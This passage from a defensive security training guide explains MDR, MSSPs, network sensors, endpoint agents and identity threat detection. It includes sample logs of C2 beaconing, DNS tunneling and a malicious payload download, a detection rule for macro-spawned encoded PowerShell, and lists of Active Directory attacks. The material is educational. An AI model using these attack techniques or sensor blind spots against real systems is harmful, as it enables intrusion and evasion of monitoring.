  • Alert: Potential data exfiltration or C2 beacon scan
```

---

## 8.4 MDR — Managed Detection and Response

### What is MDR?

MDR is a **managed security service** where a third-party provider delivers detection, investigation, and response capabilities using their technology AND their team of expert analysts — on behalf of the client.

```
MDR = Technology + People + Expertise (as a service)

vs.

In-house SOC = Technology + Your own people + Your own expertise
```

### MDR Delivery Model:

```
CLIENT ORGANIZATION:
  • Installs MDR provider's agent/sensors
  • Provides log access
  • Defines escalation contacts and policies
  
         ↕ Data flows up, responses flow down

MDR PROVIDER:
  ┌────────────────────────────────────────────────────┐
  │  MDR OPERATIONS CENTER (MOC)                       │
  │                                                    │
  │  ┌──────────────┐  ┌──────────────┐  ┌─────────┐  │
  │  │   Tier 1     │  │   Tier 2     │  │ Tier 3  │  │
  │  │   Analysts   │  │   Analysts   │  │ Experts │  │
  │  │   (Triage)   │  │(Investigation│  │(Hunting)│  │
  │  └──────────────┘  └──────────────┘  └─────────┘  │
  │                                                    │
  │  24x7x365 monitoring — no holidays, no nights off  │
  └────────────────────────────────────────────────────┘
  
CLIENT gets:
  • 24/7 expert monitoring without hiring a 24/7 team
  • Rapid response (contain in minutes, not hours)
  • Threat intelligence from thousands of clients
  • Regular reporting and security posture reviews
```

### MDR vs MSSP:

```
MDR:
  • Focused on DETECTION and RESPONSE
  • Deep investigation, root cause analysis
  • Proactive threat hunting
  • Newer model (2016+)
  • Active response (can contain, remediate)
  
MSSP (Managed Security Service Provider):
  • Broader managed security services
  • Device management (firewall, IDS management)
  • Log collection and basic alerting
  • May NOT do deep investigation or active response
  • Older model (1990s+)
  • Often just monitoring and escalating alerts

Think of it this way:
  MSSP = Security tool operator (runs your security gear)
  MDR  = Security analyst team (actively hunts and stops threats)
```

---

## 8.5 MSP vs MSSP

### MSP — Managed Service Provider

```
MSP = IT service company that manages your IT infrastructure.

Focus: IT OPERATIONS (keeping IT running)

Services:
  • Managed helpdesk
  • Network management
  • Server management and patching
  • Backup and recovery
  • Cloud management
  • Email management
  
Security Level: BASIC
  May include basic antivirus, firewall management, patch updates
  NOT a security-specialist service
  
Target: Small to medium businesses (SMBs) that outsource IT
```

### MSSP — Managed Security Service Provider

```
MSSP = Security-specialized service company that manages your security.

Focus: SECURITY (protecting IT infrastructure)

Services:
  • 24/7 security monitoring (SOC as a Service)
  • SIEM management and alerting
  • Firewall and IDS/IPS management
  • Vulnerability scanning
  • Compliance reporting
  • Incident response support
  • Threat intelligence feeds
  
Security Level: ADVANCED
  Specialized in security — not general IT
  
Target: Organizations that need expert security without a full in-house team

Examples: SecureWorks, AT&T Cybersecurity, Trustwave, Herjavec Group
```

### MSP vs MSSP vs MDR Comparison:

```
┌──────────────────┬──────────────┬──────────────┬──────────────┐
│ Characteristic   │     MSP      │     MSSP     │     MDR      │
├──────────────────┼──────────────┼──────────────┼──────────────┤
│ Primary Focus    │ IT Ops       │ Security Mgmt│ Detect+Respond│
│ Security Depth   │ Basic        │ Medium       │ Deep          │
│ Threat Hunting   │ No           │ Limited      │ Yes           │
│ Active Response  │ No           │ Sometimes    │ Yes           │
│ Incident Response│ No           │ Limited      │ Core service  │
│ Staffing (client)│ Minimal      │ Reduced      │ Minimal       │
│ Cost             │ Lowest       │ Medium       │ Medium-High   │
└──────────────────┴──────────────┴──────────────┴──────────────┘
```

---

## 8.6 Network Sensor

### What is a Network Sensor?

A network sensor is a **passive or active monitoring device/software placed at strategic points on a network** to capture, analyze, and report on network traffic for security and visibility purposes. Think of it as a camera placed at every doorway of your network — it sees everything that passes and reports back to a central system.

**Beginner analogy:** A sensor is like a CCTV camera installed on a road. The camera does not stop cars, it just records them. A security guard watching the feed (SIEM/NDR) decides if anything looks suspicious.

```
WHAT A NETWORK SENSOR LOOKS LIKE — PHYSICAL vs VIRTUAL:

PHYSICAL HARDWARE SENSOR:
  ┌──────────────────────────────────────────────────────────┐
  │   NETWORK SENSOR APPLIANCE  (e.g., Corelight, Zeek box) │
  │                                                          │
  │  ┌──────────┐  ┌──────────┐  ┌──────────┐  ┌────────┐  │
  │  │ NIC 1    │  │ NIC 2    │  │ NIC 3    │  │ MGMT   │  │
  │  │ (CAPTURE)│  │ (CAPTURE)│  │ (CAPTURE)│  │ PORT   │  │
  │  │ Gbps-10G │  │ Gbps-10G │  │ Gbps-10G │  │ 1G     │  │
  │  └──────────┘  └──────────┘  └──────────┘  └────────┘  │
  │                                                          │
  │  CPU: High-core count (packet processing is CPU heavy)   │
  │  RAM: 64GB+ (for flow table caching)                     │
  │  STORAGE: For PCAP retention (1-30 days)                 │
  │  OS: Hardened Linux (often custom build)                 │
  └──────────────────────────────────────────────────────────┘

VIRTUAL SENSOR (Software):
  • Runs as a VM or container inside a hypervisor
  • Deployed on VMware vSwitch, AWS VPC Traffic Mirroring,
    Azure vTAP, GCP Packet Mirroring
  • Same logic, no hardware box needed
  • Used in cloud environments where you cannot install hardware
```

### How a Network Sensor Behaves — Step by Step:

```
SENSOR LIFECYCLE — WHAT HAPPENS EVERY SECOND:

STEP 1: CAPTURE
  Raw packets arrive at the capture NIC (from TAP or SPAN port)
  NIC driver passes packets to capture library (libpcap / AF_PACKET)
  Packets are stored in a ring buffer in kernel memory
  ⚠️  If traffic exceeds capture rate → PACKET DROP (blind spot!)

STEP 2: DECODE / PARSE
  Sensor reads each packet's headers:
    Layer 2: MAC addresses (source/destination)
    Layer 3: IP addresses, TTL, fragmentation flags
    Layer 4: TCP/UDP ports, flags (SYN, ACK, RST), sequence numbers
    Layer 7: Protocol identification (HTTP, DNS, TLS, SMB, etc.)
  
  Sensor reconstructs TCP streams (reassembly):
    Individual packets → complete conversations
    This is how it reads full HTTP requests, DNS queries, etc.

STEP 3: FLOW TRACKING
  Sensor maintains a flow table in memory:
  
  Flow = {src_ip, dst_ip, src_port, dst_port, protocol}
  
  For each flow it tracks:
    • Bytes transferred (in each direction)
    • Packet count
    • Start/end timestamp
    • TCP flags seen
    • Application protocol identified
  
  This is called NetFlow / IPFIX data — metadata without full packet content.

STEP 4: PROTOCOL ANALYSIS (Deep Packet Inspection)
  For known protocols, sensor extracts application-layer fields:
  
  DNS query:    {query: "evil.com", type: A, client: 10.0.0.5}
  HTTP request: {method: GET, host: "evil.com", uri: "/payload.exe", user-agent: ...}
  TLS:          {server_name: "evil.com", cert_issuer: ..., cipher_suite: ...}
  SMB:          {operation: CreateFile, filename: "\\admin$\payload.exe"}
  
  These structured logs are what gets sent to the SIEM/NDR platform.

STEP 5: ALERT / LOG GENERATION
  Sensor applies detection logic:
    Rule-based:   "If DNS query resolves to known C2 domain → ALERT"
    Signature:    Snort/Suricata rules matching packet patterns
    Anomaly:      "This host sent 50,000 DNS queries in 1 minute (normal: 200)"
  
  Generates:
    • Logs (structured JSON/CEF/LEEF format)
    • Alerts (priority, type, evidence)
    • PCAP snippets (full packet capture of suspicious traffic)

STEP 6: TRANSMIT TO CENTRAL PLATFORM
  Logs → Syslog / Kafka / direct API → SIEM
  Alerts → NDR platform / SOC ticketing
  PCAP → Stored locally or in central PCAP store for forensics
```

### Network Sensor Types — Deep Dive:

```
NETWORK SENSOR TYPES:

1. TAP (Test Access Point):
   ┌─────────────────────────────────────────────────┐
   │         NETWORK LINK (e.g., server to switch)   │
   │  [Server]──────────────────────────[Switch]     │
   │                    │                            │
   │              ┌─────▼─────┐                      │
   │              │  NETWORK  │                      │
   │              │    TAP    │                      │
   │              └─────┬─────┘                      │
   │                    │ COPY (100% of traffic)      │
   │              ┌─────▼─────┐                      │
   │              │  SENSOR / │                      │
   │              │ MONITORING│                      │
   │              │   TOOL    │                      │
   │              └───────────┘                      │
   └─────────────────────────────────────────────────┘
   
   KEY PROPERTIES:
   • Hardware device — sits physically on the cable/fiber
   • Completely passive — traffic does NOT pass THROUGH the TAP
   • Cannot inject traffic — sensor cannot affect the monitored link
   • Cannot be detected — sends nothing back onto monitored link
   • FAILS OPEN — if power is lost, traffic continues flowing
   • BEST choice for high-security, zero-disruption monitoring
   • Used for: IDS sensors, forensic capture, NDR probes

2. SPAN Port (Switched Port ANalyzer):
   ┌──────────────────────────────────────────────┐
   │              NETWORK SWITCH                  │
   │   Port 1 (Server) ──────────────────────┐   │
   │   Port 2 (PC)     ──────────────────────┤   │
   │   Port 3 (Printer)──────────────────────┤   │
   │                                         │   │
   │                         SWITCH FABRIC   │   │
   │                         mirrors all     │   │
   │                         port traffic    │   │
   │                              │          │   │
   │   Port 24 (SPAN/Mirror) ◄───-┘          │   │
   │       │                                 │   │
   └───────┼─────────────────────────────────┘   │
           │                                     │
     [SENSOR receives mirrored copy]             │
   
   KEY PROPERTIES:
   • Software configuration on the switch — no extra hardware
   • COPIES traffic to a designated mirror port
   • Limitation: drops packets under heavy load (switch CPU overloaded)
   • Cannot capture traffic between two ports on same VLAN sometimes
   • Does not capture bad/malformed frames (switch drops them first)
   • Used for: quick deployment, when TAP is not feasible

3. INLINE SENSOR:
   ┌────────────────────────────────────────────────┐
   │                                                │
   │  [Server] ──── [INLINE SENSOR] ──── [Switch]  │
   │                      │                        │
   │               ALL TRAFFIC PASSES              │
   │               THROUGH THE SENSOR              │
   │                                               │
   │  Can INSPECT and BLOCK in real time           │
   │  Used as: IPS, Next-Gen Firewall, WAF         │
   └────────────────────────────────────────────────┘
   
   KEY PROPERTIES:
   • Active device — traffic MUST pass through it
   • Can block malicious traffic in real time (IPS mode)
   • Introduces latency (processing time)
   • FAILS CLOSED by default (if sensor dies, traffic stops)
     → Some models can be configured to "fail open" (bypass mode)
   • Creates a single point of failure
   • Used for: IPS, Web Application Firewall, DLP enforcement points

4. VIRTUAL / CLOUD SENSOR:
   • AWS: VPC Traffic Mirroring → mirrors ENI traffic to sensor
   • Azure: vTAP → mirrors VM NIC traffic
   • VMware: Distributed vSwitch SPAN → mirrors between VMs
   • Behaves identically to physical sensors but runs as software
   • Deployed via API — can be automated (DevSecOps)
```

### Network Sensor Placement Strategy:

```
STRATEGIC SENSOR PLACEMENT — FULL ENTERPRISE:

  Internet
     │
     ▼
  ┌──────────────────────────────────────────────────────────┐
  │ [SENSOR 1 - Internet Edge / North-South Traffic]        │
  │ POSITION: Between internet router and perimeter firewall│
  │ SEES: ALL inbound/outbound internet traffic             │
  │ DETECTS:                                                │
  │   • External reconnaissance (port scans)               │
  │   • Inbound exploit attempts                            │
  │   • Outbound C2 beacon communications                   │
  │   • Data exfiltration (large outbound data transfers)  │
  │   • DNS tunneling (data hidden in DNS queries)          │
  └──────────────────────────────────────────────────────────┘
     │
     ▼
  [Perimeter Firewall]
     │
     ├──────────────────────────────────────────────────────
     │           ▼
     │     [DMZ Zone]  ←── Web servers, email servers
     │           │
     │     ┌─────▼────────────────────────────────────────┐
     │     │ [SENSOR 2 - DMZ Monitor]                     │
     │     │ DETECTS: Server compromise, web shell, RCE   │
     │     └──────────────────────────────────────────────┘
     │
     ├──────────────────────────────────────────────────────
     │           ▼
     │     [Internal Network / Core Switch]
     │           │
     │     ┌─────▼────────────────────────────────────────┐
     │     │ [SENSOR 3 - East/West Internal Traffic]      │
     │     │ POSITION: Core switch SPAN / TAP             │
     │     │ SEES: Machine-to-machine internal traffic    │
     │     │ DETECTS:                                     │
     │     │   • Lateral movement (attacker jumping hosts)│
     │     │   • Internal port scanning                   │
     │     │   • SMB spreading (WannaCry-style worm)      │
     │     │   • Insider threats                          │
     │     └──────────────────────────────────────────────┘
     │
     ├──────────────────────────────────────────────────────
     │           ▼
     │     [Crown Jewels Segment]
     │     Domain Controller | DB Servers | Finance
     │           │
     │     ┌─────▼────────────────────────────────────────┐
     │     │ [SENSOR 4 - Critical Asset Protection]       │
     │     │ POSITION: Directly in front of DC/DB segment │
     │     │ DETECTS:                                     │
     │     │   • Unauthorized Kerberos ticket requests    │
     │     │   • DCSync replication from non-DCs          │
     │     │   • Unusual database queries                 │
     │     │   • RDP connections from unexpected sources  │
     │     └──────────────────────────────────────────────┘
```

### What Data Does a Sensor Actually Generate?

```
SENSOR OUTPUT EXAMPLES:

1. FLOW LOG (NetFlow/IPFIX):
   {
     "timestamp": "2024-01-15T03:42:17Z",
     "src_ip": "192.168.1.50",
     "dst_ip": "45.33.32.156",       ← External IP (known C2 server)
     "src_port": 49234,
     "dst_port": 443,
     "protocol": "TCP",
     "bytes_out": 524288,            ← 512KB sent out
     "bytes_in": 2048,
     "duration": "1800s",            ← Steady 30-minute connection
     "app_proto": "TLS"
   }
   ANALYST INTERPRETATION: Regular beaconing pattern — C2 over TLS

2. DNS LOG (from sensor DPI):
   {
     "timestamp": "2024-01-15T03:42:18Z",
     "client": "192.168.1.50",
     "query": "aGVsbG8gd29ybGQ.evil-c2.com",   ← Base64 in subdomain!
     "type": "TXT",
     "response": "d29ya2Vy",                   ← Base64 response
     "bytes_in_query": 340                     ← Abnormally large
   }
   ANALYST INTERPRETATION: DNS tunneling — data hidden in DNS queries

3. HTTP LOG:
   {
     "method": "POST",
     "host": "legitimate-looking-domain.com",
     "uri": "/api/update",
     "user_agent": "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1)",
     "bytes_out": 52000,             ← Sending 52KB in a POST
     "referrer": "-",               ← No referrer (not from browser)
     "resp_code": 200
   }
   ANALYST INTERPRETATION: Fake User-Agent + no referrer + POST = malware HTTP C2
```

### Sensor vs Firewall vs IDS — Common Confusion:

| Feature | Network Sensor (Passive) | Firewall | IDS | IPS |
|---------|--------------------------|----------|-----|-----|
| Sees traffic? | Yes — copy | Yes — all | Yes — copy | Yes — inline |
| Blocks traffic? | NO | Yes | NO | Yes |
| Fails safe? | Yes (fails open) | Depends | Yes | Fails closed |
| Purpose | Visibility/detection | Enforcement | Detection only | Block + detect |
| Performance impact | None (passive) | Some | None | Yes (inline) |

---

## 8.7 Agent (Security Agent)

### What is a Security Agent?

A security agent is a **lightweight software component installed directly on an endpoint** (laptop, server, workstation, cloud VM) that runs continuously in the background, collecting security telemetry, enforcing security policies, and taking response actions on behalf of a central security platform.

**Beginner analogy:** An agent is like an undercover security officer embedded inside a building. The officer watches everything happening inside (processes, files, logins), can immediately stop a threat on the spot (kill a process, lock a door), and reports everything back to HQ in real time. A sensor outside the building (network sensor) can only see who walks in and out — it cannot see what happens inside.

```
SECURITY AGENT — WHAT IT LOOKS LIKE ON YOUR SYSTEM:

On Windows:
  Task Manager → Services:
    "CrowdStrike Falcon Sensor"      (EDR agent)
    "SentinelOne Agent"              (EDR agent)
    "Qualys Cloud Agent"             (Vulnerability scan agent)
    "Splunk Universal Forwarder"     (SIEM log shipping agent)
    "Carbon Black Sensor"            (EDR agent)

  Installed as:
    • Windows Service (runs as SYSTEM)
    • Kernel driver (for deep OS hooks)
    • User-mode process (for UI / config)

On Linux:
  ps aux | grep -i "agent\|sensor\|falcon\|sentinel"
    /opt/CrowdStrike/falcond          ← EDR agent daemon
    /usr/local/qualys-cloud-agent     ← Vuln scan agent
    /opt/splunkforwarder/bin/splunkd  ← SIEM forwarder

  System files:
    /etc/init.d/ or /lib/systemd/system/  → Agent service definitions
    /var/log/crowdstrike/                 → Agent local logs
    /opt/CrowdStrike/                     → Agent installation directory
```

### How an Agent Works Internally — Step by Step:

```
AGENT INTERNALS — WHAT HAPPENS ON EVERY ACTION:

STEP 1: INSTALLATION (one-time)
  IT/SecOps deploys agent via:
    • Group Policy (GPO) for Windows domain
    • SCCM / Intune / Ansible
    • Cloud-init script for VM provisioning
    • Manual install for standalone systems
  
  Agent installs:
    • Kernel driver (for OS-level hooks)
    • User-mode service (for config, comms)
    • Certificate for encrypted comms to platform
    • Local cache (for offline operation)

STEP 2: CONTINUOUS MONITORING (every millisecond)
  The agent hooks into the OS at multiple levels:
  
  KERNEL LEVEL (deepest — most powerful):
    Windows:
      • PsSetCreateProcessNotifyRoutine → called on EVERY process create/exit
      • PsSetCreateThreadNotifyRoutine → called on EVERY thread create/exit
      • CmRegisterCallback → called on EVERY registry change
      • ObRegisterCallbacks → called on EVERY object access
      • FltRegisterFilter (minifilter driver) → called on EVERY file I/O
      
    Linux:
      • kprobes / eBPF programs → hook system calls (execve, open, connect...)
      • audit subsystem → kernel-level audit rules
      • netfilter hooks → packet-level network visibility

  USER SPACE LEVEL:
    • ETW (Event Tracing for Windows) — high-speed event stream from OS
    • Windows Event Log subscription — Security/System/Application logs
    • Userland API hooking (ntdll.dll) — intercept API calls from processes
    • WMI subscription — monitor WMI event consumers (attacker persistence)

STEP 3: TELEMETRY COLLECTION
  Every interesting event generates a telemetry record:
  
  PROCESS EVENT example:
  {
    "event_type": "ProcessCreate",
    "timestamp": "2024-01-15T03:42:17.331Z",
    "parent_process": "cmd.exe",
    "parent_pid": 4412,
    "parent_cmdline": "cmd.exe /c whoami",
    "child_process": "whoami.exe",
    "child_pid": 5621,
    "child_path": "C:\\Windows\\System32\\whoami.exe",
    "user": "CORP\\jsmith",
    "user_privilege": "Standard",
    "hash_sha256": "a04f51...",
    "signed": true,
    "signer": "Microsoft Corporation"
  }

  FILE EVENT example:
  {
    "event_type": "FileWrite",
    "path": "C:\\Users\\jsmith\\AppData\\Roaming\\malware.exe",
    "process": "outlook.exe",   ← Outlook writing an EXE? SUSPICIOUS!
    "size_bytes": 524288,
    "hash_sha256": "4d3a9f...",
    "timestamp": "2024-01-15T03:42:18.002Z"
  }

STEP 4: LOCAL DETECTION (on-device AI/rules)
  Agent does NOT just send raw data — it applies detection LOCALLY:
  
  Rule example:
    IF parent_process == "word.exe"
    AND child_process == "powershell.exe"
    AND child_cmdline contains "-encodedcommand"
    THEN → ALERT: "Macro spawning encoded PowerShell — likely malicious"
    ACTION: Kill child process + Alert platform
  
  Benefits of local detection:
    • Zero latency response (milliseconds, not seconds)
    • Works even when offline / disconnected from platform
    • Reduces bandwidth (only send suspicious events, not everything)

STEP 5: SECURE COMMUNICATION TO CENTRAL PLATFORM
  Agent → Platform channel:
    • TLS 1.3 encrypted (certificate-pinned)
    • Authenticated with client certificate (agent identity)
    • Compressed (telemetry volume is massive)
    • Heartbeat every 30-60 seconds (agent health check)
  
  What gets sent:
    • All process, file, network, registry events (raw telemetry)
    • Local detections / alerts (with full evidence)
    • System inventory (installed software, services, users)
    • Agent health status

STEP 6: RECEIVE COMMANDS FROM PLATFORM
  Platform → Agent (response actions):
    • "Isolate this endpoint" → Agent drops all network except platform comms
    • "Kill PID 5621"         → Agent terminates process
    • "Quarantine file X"     → Agent moves/encrypts malicious file
    • "Collect memory dump"   → Agent captures RAM for forensics
    • "Run script Y"          → Agent executes remediation script
    • "Collect artifact"      → Agent grabs specific logs/files
```

### Agent Architecture Diagram — Full Picture:

```
FULL AGENT ARCHITECTURE:

  ┌──────────────────────────────────────────────────────────────┐
  │                    ENDPOINT (Windows/Linux/Mac)              │
  │                                                              │
  │  ┌──────────────────────────────────────────────────────┐   │
  │  │                  KERNEL SPACE                        │   │
  │  │                                                      │   │
  │  │  ┌────────────┐  ┌──────────────┐  ┌─────────────┐  │   │
  │  │  │   Process  │  │  File System │  │  Network    │  │   │
  │  │  │   Monitor  │  │  Minifilter  │  │  Filter     │  │   │
  │  │  │  (driver)  │  │  (driver)   │  │  (driver)  │  │   │
  │  │  └─────┬──────┘  └──────┬───────┘  └──────┬──────┘  │   │
  │  └────────┼────────────────┼─────────────────┼──────────┘   │
  │           │                │                 │              │
  │  ┌────────▼────────────────▼─────────────────▼──────────┐   │
  │  │               USER SPACE — AGENT SERVICE             │   │
  │  │                                                      │   │
  │  │   ┌────────────┐  ┌──────────┐  ┌───────────────┐   │   │
  │  │   │ Detection  │  │ Policy   │  │  Response     │   │   │
  │  │   │ Engine     │  │ Engine   │  │  Engine       │   │   │
  │  │   │            │  │          │  │               │   │   │
  │  │   │ Rules/ML   │  │ Block/   │  │ Isolate/Kill/ │   │   │
  │  │   │ matching   │  │ Allow    │  │ Quarantine    │   │   │
  │  │   └─────┬──────┘  └────┬─────┘  └──────┬────────┘   │   │
  │  │         │              │                │            │   │
  │  │   ┌─────▼──────────────▼────────────────▼──────┐    │   │
  │  │   │         COMMUNICATION MODULE               │    │   │
  │  │   │   TLS 1.3 / Certificate-Pinned Channel     │    │   │
  │  │   │   Heartbeat + Telemetry + Commands         │    │   │
  │  │   └───────────────────────┬────────────────────┘    │   │
  │  └───────────────────────────┼────────────────────────-┘   │
  └──────────────────────────────┼──────────────────────────────┘
                                 │ Internet / Corporate Network
                                 ▼
                    ┌────────────────────────┐
                    │   CENTRAL PLATFORM     │
                    │   (EDR/XDR/SIEM/MDR)  │
                    │                        │
                    │  • Receives telemetry  │
                    │  • Correlates events   │
                    │  • Sends commands      │
                    │  • SOC analyst console │
                    └────────────────────────┘
```

### Agent vs Agentless — Full Comparison:

```
AGENT-BASED:
  Advantages:
    ✅ Deep visibility (kernel-level hooks — sees EVERYTHING)
    ✅ Can take response actions (isolate, kill, block, script)
    ✅ Works OFFLINE (local detection even when disconnected)
    ✅ Sees ENCRYPTED traffic content (decrypts locally before encryption)
    ✅ Process-level attribution (WHICH process did WHAT)
    ✅ Memory analysis capability
    ✅ File/registry/process tree correlation
  Disadvantages:
    ❌ Must be installed on each endpoint (deployment effort)
    ❌ Resource consumption (typically 1-5% CPU, 200-500MB RAM)
    ❌ OS compatibility constraints (specific kernel versions)
    ❌ Adversaries may target/disable the agent itself
    ❌ Cannot cover IoT/OT/printers/BYOD (no agent support)

AGENTLESS:
  Advantages:
    ✅ No installation on endpoints
    ✅ Zero endpoint resource impact
    ✅ Covers ANY device with a network connection (IoT, OT, printers)
    ✅ Works on legacy systems (old Windows, embedded OS)
    ✅ No deployment management
  Disadvantages:
    ❌ Only network-level visibility (can't see inside processes)
    ❌ Cannot take endpoint response actions
    ❌ Blind to encrypted traffic CONTENT (sees metadata only)
    ❌ No memory or file system visibility
    ❌ No user attribution (who ran what)
```

### THE KEY DIFFERENCE: Agent vs Network Sensor — Master Comparison

This is one of the most commonly confused concepts in cybersecurity. Here is the complete breakdown:

```
AGENT vs NETWORK SENSOR — MASTER COMPARISON TABLE

┌─────────────────────┬─────────────────────────┬──────────────────────────┐
│ DIMENSION           │ SECURITY AGENT           │ NETWORK SENSOR           │
├─────────────────────┼─────────────────────────┼──────────────────────────┤
│ WHERE it lives      │ INSIDE the endpoint      │ ON the network           │
│                     │ (installed software)     │ (TAP/SPAN/inline)        │
├─────────────────────┼─────────────────────────┼──────────────────────────┤
│ WHAT it sees        │ Processes, files,        │ Network packets,         │
│                     │ registry, memory,        │ flows, protocols,        │
│                     │ user activity, APIs      │ DNS, HTTP headers        │
├─────────────────────┼─────────────────────────┼──────────────────────────┤
│ Encrypted traffic   │ YES — decrypts locally   │ NO — sees metadata only  │
│ visibility          │ before traffic leaves    │ (TLS = black box)        │
├─────────────────────┼─────────────────────────┼──────────────────────────┤
│ Response actions    │ YES — kill process,      │ NO (passive) or          │
│                     │ isolate host, quarantine │ YES (inline IPS only)    │
├─────────────────────┼─────────────────────────┼──────────────────────────┤
│ Covers IoT/OT/BYOD  │ NO — needs installation  │ YES — sees all devices   │
├─────────────────────┼─────────────────────────┼──────────────────────────┤
│ Works offline       │ YES — local detection    │ NO — needs network       │
├─────────────────────┼─────────────────────────┼──────────────────────────┤
│ What threat it      │ • Malicious processes    │ • Network-based attacks  │
│ catches best        │ • Fileless malware       │ • C2 beaconing           │
│                     │ • Privilege escalation   │ • Lateral movement       │
│                     │ • Insider threats        │ • DNS tunneling          │
│                     │ • In-memory attacks      │ • Data exfiltration      │
├─────────────────────┼─────────────────────────┼──────────────────────────┤
│ Deployment          │ Requires install on      │ Deploy once at network   │
│                     │ every managed endpoint   │ choke point — covers all │
├─────────────────────┼─────────────────────────┼──────────────────────────┤
│ Used in product     │ EDR, XDR, SIEM forwarder │ NDR, IDS/IPS, NTA        │
├─────────────────────┼─────────────────────────┼──────────────────────────┤
│ Example products    │ CrowdStrike Falcon,      │ Corelight, Darktrace,    │
│                     │ SentinelOne, Splunk UF   │ ExtraHop, Vectra AI      │
└─────────────────────┴─────────────────────────┴──────────────────────────┘
```

### Real-World Attack Scenario — What Each Sees:

```
SCENARIO: Attacker sends phishing email → victim opens Word doc with
          malicious macro → macro runs PowerShell → downloads malware
          → malware connects to C2 server over HTTPS

WHAT THE NETWORK SENSOR SEES:
  ✅ HTTPS connection to external IP (45.33.32.156:443)
  ✅ DNS query for "evil-c2.xyz" before connection
  ✅ Unusual outbound data volume (beaconing pattern)
  ✅ TLS certificate details (self-signed, suspicious domain)
  ❌ CANNOT see: which process made the connection
  ❌ CANNOT see: what was in the encrypted HTTPS payload
  ❌ CANNOT see: the PowerShell command that ran
  ❌ CANNOT see: the file that was dropped

WHAT THE AGENT SEES:
  ✅ Word.exe spawning PowerShell.exe (parent-child anomaly)
  ✅ PowerShell.exe with -encodedCommand flag (obfuscation)
  ✅ PowerShell downloading "malware.exe" to %AppData%
  ✅ malware.exe writing registry key for persistence
  ✅ malware.exe making network connection to 45.33.32.156:443
  ✅ Full PowerShell command decoded (base64 decoded locally)
  ✅ Memory injection into explorer.exe for stealth
  ❌ CANNOT cover: BYOD device that has no agent installed

CONCLUSION: Agent + Sensor together = complete picture.
Neither alone is sufficient. That is why XDR combines both.
```

---

## 8.8 ITDR — Identity Threat Detection and Response

### What is ITDR?

ITDR is a **security discipline and toolset focused specifically on detecting and responding to threats targeting identity infrastructure** — including Active Directory, Azure AD, IAM systems, and privileged accounts.

```
WHY ITDR EMERGED:

Modern attacks ALWAYS involve identity:
  Phase 1: Initial access (steal credentials via phishing)
  Phase 2: Privilege escalation (abuse AD misconfigs)
  Phase 3: Lateral movement (use compromised accounts)
  Phase 4: Persistence (create backdoor accounts, golden tickets)

EDR protects ENDPOINTS.
ITDR protects IDENTITIES (AD, cloud IAM, PAM, SSO).

Without ITDR: A Golden Ticket attack is invisible to EDR.
With ITDR: Anomalous Kerberos ticket lifetimes are detected.
```

### What ITDR Monitors and Detects:

```
IDENTITY ATTACKS DETECTED:

Password Attacks:
  • Brute force / Password spray (Event ID 4625 patterns)
  • Credential stuffing (successful logins from new geographies)

Kerberos Attacks:
  • Kerberoasting (unusual TGS-REQ for service accounts)
  • AS-REP Roasting (TGT requests without pre-auth)
  • Golden Ticket usage (TGT with anomalous lifetime or attributes)
  • Silver Ticket usage (service tickets without corresponding TGT)
  • Pass-the-Ticket (TGT used from different machine than issued to)

Active Directory Attacks:
  • DCSync (replication requests from non-DC machines)
  • DCShadow (rogue DC registration)
  • AdminSDHolder modification (privilege persistence)
  • Group membership changes (adding to Domain Admins)
  • GPO modifications (lateral movement, persistence)
  • SID History injection

Lateral Movement via Identity:
  • Pass-the-Hash (NTLM authentication with hash)
  • Overpass-the-Hash (NTLM hash used to get Kerberos ticket)
  • Abnormal admin tool usage (PSExec, WMI, RDP from unusual accounts)

Cloud Identity Attacks:
  • Impossible travel (login from NY at 9am, London at 9:05am)
  • MFA bypass techniques (SIM swapping, MFA fatigue/bombing)
  • OAuth consent grant phishing (malicious app granted permissions)
  • Service principal abuse (Azure AD app with excessive permissions)
```

### ITDR — The Response Part Explained (Deep Dive)

This is the part most explanations skip. "Detection" is clear — ITDR detects identity attacks. But **how does ITDR actually respond?** What does the "R" in ITDR do, step by step?

```
ITDR RESPONSE ARCHITECTURE — THE BIG PICTURE:

  IDENTITY ATTACK OCCURS
         │
         ▼
  ┌──────────────────────────────────────────────────────────┐
  │  DETECTION LAYER                                         │
  │  • ITDR sensor monitors DC logs, Kerberos traffic,       │
  │    LDAP queries, authentication events                   │
  │  • Detection: "Golden Ticket detected — TGT lifetime     │
  │    is 10 years (anomalous). Source: HOST-FINANCE-01"     │
  └──────────────────────┬───────────────────────────────────┘
                         │  Alert generated (high severity)
                         ▼
  ┌──────────────────────────────────────────────────────────┐
  │  TRIAGE / ENRICHMENT LAYER                               │
  │  ITDR automatically enriches the alert:                  │
  │  • Who is the user account? (jsmith — Finance dept)      │
  │  • Is it a privileged account? (YES — Domain Admin)      │
  │  • What is the source host? (HOST-FINANCE-01)            │
  │  • What did this account do in last 60 mins?             │
  │    → Accessed 47 file servers (abnormal — normal: 2)     │
  │    → Ran DCSync from HOST-FINANCE-01 (critical!)         │
  │  • Risk score: CRITICAL (10/10)                          │
  └──────────────────────┬───────────────────────────────────┘
                         │
                         ▼
  ┌──────────────────────────────────────────────────────────┐
  │  AUTOMATED RESPONSE LAYER                                │
  │  (Executed within seconds — no human needed)             │
  │                                                          │
  │  Action 1: FORCE ACCOUNT DISABLE                        │
  │    → ITDR API → Active Directory                         │
  │    → userAccountControl flag set to DISABLED             │
  │    → User jsmith can no longer authenticate              │
  │                                                          │
  │  Action 2: TICKET INVALIDATION (krbtgt reset prep)       │
  │    → Flag: "Golden Ticket in use — krbtgt reset needed"  │
  │    → Create task for IR team: reset krbtgt TWICE         │
  │                                                          │
  │  Action 3: SESSION REVOCATION                           │
  │    → Azure AD: revoke all active sessions/refresh tokens │
  │    → On-prem: force logoff of active sessions            │
  │                                                          │
  │  Action 4: HOST ISOLATION (via EDR integration)          │
  │    → ITDR calls EDR API (CrowdStrike / SentinelOne)      │
  │    → HOST-FINANCE-01 is network-isolated                 │
  │    → Prevents further lateral movement from this host    │
  │                                                          │
  │  Action 5: SOAR PLAYBOOK TRIGGER                        │
  │    → ITDR sends alert to SOAR platform                   │
  │    → SOAR runs "Golden Ticket Response Playbook"         │
  │    → Notifies IR team via PagerDuty/Slack                │
  │    → Creates P1 ticket in ServiceNow                     │
  └──────────────────────┬───────────────────────────────────┘
                         │
                         ▼
  ┌──────────────────────────────────────────────────────────┐
  │  HUMAN-LED RESPONSE LAYER                                │
  │  (IR Analyst takes over with full context pre-populated) │
  │                                                          │
  │  Phase 1 — Contain (first 30 minutes):                   │
  │    • Confirm account disable is effective                │
  │    • Identify ALL hosts where attacker authenticated     │
